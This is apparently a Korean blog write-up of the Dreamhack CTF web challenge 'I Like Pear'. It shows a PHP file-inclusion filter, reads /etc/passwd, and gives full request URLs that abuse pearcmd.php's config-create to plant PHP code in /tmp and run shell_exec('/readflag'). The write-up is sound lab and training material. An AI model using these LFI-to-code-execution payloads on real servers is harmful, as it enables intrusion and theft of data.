---
layout: single
title: "[Dreamhack] I Like Pear write-up"
date: 2025-06-12 23:42 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] I Like Pear

### 문제 설명

- Probably not the pear you're thinking of .. 🤔

<br>

### ✏️ 풀이

먼저 문제 사이트에 접속해보면 아무것도 표시되지 않는다.

![image-20250605140458686](/images/2025-06-05-I-Like-Pear/image-20250605140458686.png)

<br>

소스 코드를 살펴보면, file 파라미터를 get 메소드로 받아와 여러 스키마들을 키워드별로 차단하고 있다. LFI 취약점에 대한 문제인 것 같다.

```php
<?php
    ini_set("session.upload_progress.enabled", "Off");
    ini_set("file_uploads", "Off");
    ini_set('display_errors', '0');

    if(isset($_GET["file"])) {
        if (preg_match("/^(file:|http:|ftp:|zlib:|data:|glob:|phar:|zip:|expect:|php:)/i", $_GET["file"])) {
            die("HAHA... 😀");
        }
        include($_GET["file"]);
    }
?>

```

<br>

file 파라미터에 `/etc/passwd` 를 넣어서 확인해보면 passwd 파일이 잘 출력되는 것을 확인할 수 있다.

![image-20250608180817386](/images/2025-06-05-I-Like-Pear/image-20250608180817386.png)

<br>

Dockerfile을 확인해보니 readflag.c를 컴파일한 readflag 파일에 SetUID가 설정된 것을 알 수 있다.

```docker
FROM php:8.0-apache

RUN apt update && apt install gcc

RUN rm -rf /var/www/html/*

COPY flag.txt /flag.txt
COPY readflag.c /tmp/readflag.c

RUN chmod 440 /flag.txt
RUN gcc /tmp/readflag.c -o /readflag
RUN rm /tmp/readflag.c
RUN chmod 2555 /readflag

COPY src /var/www/html/
RUN chmod 555 /var/www/html

RUN ln -sf /dev/null /var/log/apache2/access.log && \
    ln -sf /dev/null /var/log/apache2/error.log

USER root

EXPOSE 80
```

<br>

/readflag를 file 파라미터에 넣어서 확인해보면 /readflag는 바이너리 파일이라 읽을 수 없어 아래와 같이 오류가 발생한다. 따라서 다른 방법으로 /readflag를 읽어와야 한다.

![image-20250608181449228](/images/2025-06-05-I-Like-Pear/image-20250608181449228.png)

<br>

pear는 (PHP Extension and Application Repository)의 약자로 pearcmd.php라는 파일을 이용해서 LFI 취약점이 있다면 이를 이용해서 문제를 풀 수 있을 것 같다.

<br>
아래 사이트를 참고해서 dockerfile을 빌드해서 확인해보면 pearcmd.php 파일이 `/usr/local/lib/php/pearcmd.php` 경로에 존재하는 것을 알 수 있다. 또한 이는 CLI로 실행되는데 웹 서버 환경에서 실행되기 위해서 아래와 같이 config-create라는 pear의 명령어를 이용해 /tmp/hello.php 파일에 phpinfo 내용이 담기도록 요청할 수 있다.

```
/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
```

- https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=nl&_x_tr_pto=wapp

- https://book.jorianwoltjer.com/languages/php

<br>

burp를 이용해 /tmp/hello.php에 phpinfo를 생성하는 명령을 요청하고 LFI 취약점을 이용해 확인해보면 아래와 같이 phpinfo가 잘 생성된 것을 확인할 수 있다.

![image-20250613163044808](/images/2025-06-05-I-Like-Pear/image-20250613163044808.png)

<br>

하지만 우린 /readflag 를 읽어와야 하기 때문에 phpinfo를 읽어오는게 아닌 /readflag를 실행하여 출력해야 한다. 따라서 아래의 명령으로 /readflag를 실행하여 출력하면 된다.

```php
<?=shell_exec("/readflag")?>
```

<br>

아래처럼 요청하고 잘 읽어보면 flag가 포함되어 출력되는 것을 볼 수 있다.

```
/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=shell_exec("/readflag")?>+/tmp/hello.php
```

![image-20250613163713332](/images/2025-06-05-I-Like-Pear/image-20250613163713332.png)



<br>

